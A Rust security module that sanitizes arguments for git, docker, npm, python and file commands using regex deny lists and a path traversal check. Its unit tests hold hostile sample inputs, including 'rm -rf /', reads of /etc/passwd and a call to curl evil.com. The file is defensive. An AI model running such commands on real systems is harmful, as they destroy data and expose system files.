// file: src/security/sanitizer.rs
// version: 1.0.0
// guid: b2c3d4e5-f6a7-8901-bcde-f23456789012

//! Argument sanitization module
//!
//! This module provides comprehensive sanitization of command arguments to prevent
//! injection attacks and other security vulnerabilities.

use crate::error::{AgentError, Result};
use regex::Regex;
use tracing::debug;

/// Sanitize command arguments based on command-specific rules
pub fn sanitize_arguments(command: &str, args: &[String]) -> Result<Vec<String>> {
    let mut sanitized = Vec::new();

    for arg in args {
        let clean_arg = match command {
            "git" => sanitize_git_argument(arg)?,
            "buf" => sanitize_buf_argument(arg)?,
            "cargo" => sanitize_cargo_argument(arg)?,
            "go" => sanitize_go_argument(arg)?,
            "docker" => sanitize_docker_argument(arg)?,
            "npm" | "yarn" | "pnpm" => sanitize_node_argument(arg)?,
            "python" | "python3" => sanitize_python_argument(arg)?,
            "ls" | "cat" | "cp" | "mv" | "rm" | "mkdir" | "find" | "grep" => {
                sanitize_file_argument(arg)?
            }
            _ => sanitize_generic_argument(arg)?,
        };

        if clean_arg != *arg {
            debug!("Sanitized argument '{}' -> '{}'", arg, clean_arg);
        }

        sanitized.push(clean_arg);
    }

    Ok(sanitized)
}

/// Sanitize git command arguments
fn sanitize_git_argument(arg: &str) -> Result<String> {
    // Block dangerous git operations
    let dangerous_patterns = [
        r"--upload-pack=",
        r"--receive-pack=",
        r"--exec=",
        r"--ssh-command=",
        r"`",
        r"\$\(",
        r"\$\{",
        r"&&",
        r"\|\|",
        r";",
        r"\|",
    ];

    for pattern in &dangerous_patterns {
        let regex = Regex::new(pattern).map_err(|e| AgentError::validation(format!("Regex error: {}", e)))?;
        if regex.is_match(arg) {
            return Err(AgentError::security(format!(
                "Git argument contains dangerous pattern '{}': {}",
                pattern, arg
            )));
        }
    }

    // Remove potentially dangerous characters but preserve valid git syntax
    let clean = arg
        .chars()
        .filter(|c| {
            c.is_alphanumeric()
                || " -_.:/=@#[](){}^~".contains(*c)
                || *c == '\''
                || *c == '"'
        })
        .collect::<String>();

    validate_length(&clean, 1000)?;
    Ok(clean)
}

/// Sanitize buf command arguments
fn sanitize_buf_argument(arg: &str) -> Result<String> {
    // Buf is generally safe, but check for command injection
    check_for_injection_patterns(arg)?;

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=".contains(*c))
        .collect::<String>();

    validate_length(&clean, 500)?;
    Ok(clean)
}

/// Sanitize cargo command arguments
fn sanitize_cargo_argument(arg: &str) -> Result<String> {
    // Cargo can execute arbitrary code via build scripts, so be extra careful
    let dangerous_patterns = [
        r"--config",
        r"--target-dir=/",
        r"`",
        r"\$\(",
        r"&&",
        r"\|\|",
        r";",
    ];

    for pattern in &dangerous_patterns {
        let regex = Regex::new(pattern).map_err(|e| AgentError::validation(format!("Regex error: {}", e)))?;
        if regex.is_match(arg) {
            return Err(AgentError::security(format!(
                "Cargo argument contains dangerous pattern '{}': {}",
                pattern, arg
            )));
        }
    }

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=".contains(*c))
        .collect::<String>();

    validate_length(&clean, 500)?;
    Ok(clean)
}

/// Sanitize go command arguments
fn sanitize_go_argument(arg: &str) -> Result<String> {
    check_for_injection_patterns(arg)?;

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=".contains(*c))
        .collect::<String>();

    validate_length(&clean, 500)?;
    Ok(clean)
}

/// Sanitize docker command arguments
fn sanitize_docker_argument(arg: &str) -> Result<String> {
    // Docker can be particularly dangerous
    let dangerous_patterns = [
        r"--privileged",
        r"--user.*root",
        r"--volume.*:/",
        r"--mount.*type=bind.*source=/",
        r"`",
        r"\$\(",
        r"&&",
        r"\|\|",
        r";",
    ];

    for pattern in &dangerous_patterns {
        let regex = Regex::new(pattern).map_err(|e| AgentError::validation(format!("Regex error: {}", e)))?;
        if regex.is_match(arg) {
            return Err(AgentError::security(format!(
                "Docker argument contains dangerous pattern '{}': {}",
                pattern, arg
            )));
        }
    }

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=".contains(*c))
        .collect::<String>();

    validate_length(&clean, 1000)?;
    Ok(clean)
}

/// Sanitize Node.js ecosystem command arguments
fn sanitize_node_argument(arg: &str) -> Result<String> {
    // npm/yarn can execute scripts, so be careful
    let dangerous_patterns = [
        r"--unsafe-perm",
        r"--allow-root",
        r"`",
        r"\$\(",
        r"&&",
        r"\|\|",
        r";",
    ];

    for pattern in &dangerous_patterns {
        let regex = Regex::new(pattern).map_err(|e| AgentError::validation(format!("Regex error: {}", e)))?;
        if regex.is_match(arg) {
            return Err(AgentError::security(format!(
                "Node argument contains dangerous pattern '{}': {}",
                pattern, arg
            )));
        }
    }

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=@".contains(*c))
        .collect::<String>();

    validate_length(&clean, 500)?;
    Ok(clean)
}

/// Sanitize Python command arguments
fn sanitize_python_argument(arg: &str) -> Result<String> {
    // Python can execute arbitrary code
    let dangerous_patterns = [
        r"-c\s+",
        r"--command\s+",
        r"exec\s*\(",
        r"eval\s*\(",
        r"__import__\s*\(",
        r"`",
        r"\$\(",
        r"&&",
        r"\|\|",
        r";",
    ];

    for pattern in &dangerous_patterns {
        let regex = Regex::new(pattern).map_err(|e| AgentError::validation(format!("Regex error: {}", e)))?;
        if regex.is_match(arg) {
            return Err(AgentError::security(format!(
                "Python argument contains dangerous pattern '{}': {}",
                pattern, arg
            )));
        }
    }

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=".contains(*c))
        .collect::<String>();

    validate_length(&clean, 500)?;
    Ok(clean)
}

/// Sanitize file operation arguments
fn sanitize_file_argument(arg: &str) -> Result<String> {
    // Check for path traversal
    if arg.contains("..") {
        return Err(AgentError::security(format!(
            "File argument contains path traversal: {}",
            arg
        )));
    }

    // Check for other dangerous patterns
    check_for_injection_patterns(arg)?;

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/".contains(*c))
        .collect::<String>();

    validate_length(&clean, 1000)?;
    Ok(clean)
}

/// Generic argument sanitization
fn sanitize_generic_argument(arg: &str) -> Result<String> {
    check_for_injection_patterns(arg)?;

    let clean = arg
        .chars()
        .filter(|c| c.is_alphanumeric() || " -_.:/=".contains(*c))
        .collect::<String>();

    validate_length(&clean, 500)?;
    Ok(clean)
}

/// Check for common injection patterns
fn check_for_injection_patterns(arg: &str) -> Result<()> {
    let injection_patterns = [
        r"`",
        r"\$\(",
        r"\$\{",
        r"&&",
        r"\|\|",
        r";\s*",
        r"\|\s*",
        r">\s*",
        r"<\s*",
        r"eval\s*\(",
        r"exec\s*\(",
        r"system\s*\(",
        r"popen\s*\(",
        r"__import__\s*\(",
    ];

    for pattern in &injection_patterns {
        let regex = Regex::new(pattern).map_err(|e| AgentError::validation(format!("Regex error: {}", e)))?;
        if regex.is_match(arg) {
            return Err(AgentError::security(format!(
                "Argument contains dangerous injection pattern '{}': {}",
                pattern, arg
            )));
        }
    }

    Ok(())
}

/// Validate argument length
fn validate_length(arg: &str, max_length: usize) -> Result<()> {
    if arg.len() > max_length {
        return Err(AgentError::validation(format!(
            "Argument too long ({} > {} chars): {}...",
            arg.len(),
            max_length,
            &arg[..50.min(arg.len())]
        )));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_git_sanitization() {
        // Safe arguments
        assert!(sanitize_git_argument("status").is_ok());
        assert!(sanitize_git_argument("add .").is_ok());
        assert!(sanitize_git_argument("commit -m 'message'").is_ok());

        // Dangerous arguments
        assert!(sanitize_git_argument("--upload-pack=evil").is_err());
        assert!(sanitize_git_argument("status && rm -rf /").is_err());
        assert!(sanitize_git_argument("status; cat /etc/passwd").is_err());
        assert!(sanitize_git_argument("$(cat /etc/passwd)").is_err());
    }

    #[test]
    fn test_injection_detection() {
        let dangerous_inputs = [
            "normal_arg && rm -rf /",
            "normal_arg; cat /etc/passwd",
            "normal_arg || curl evil.com",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "eval('evil code')",
            "exec('evil code')",
        ];

        for input in &dangerous_inputs {
            assert!(check_for_injection_patterns(input).is_err(),
                   "Should reject dangerous input: {}", input);
        }
    }

    #[test]
    fn test_length_validation() {
        let long_string = "a".repeat(2000);
        assert!(validate_length(&long_string, 1000).is_err());
        assert!(validate_length("normal", 1000).is_ok());
    }

    #[test]
    fn test_path_traversal() {
        assert!(sanitize_file_argument("../../../etc/passwd").is_err());
        assert!(sanitize_file_argument("normal/path/file.txt").is_ok());
    }
}
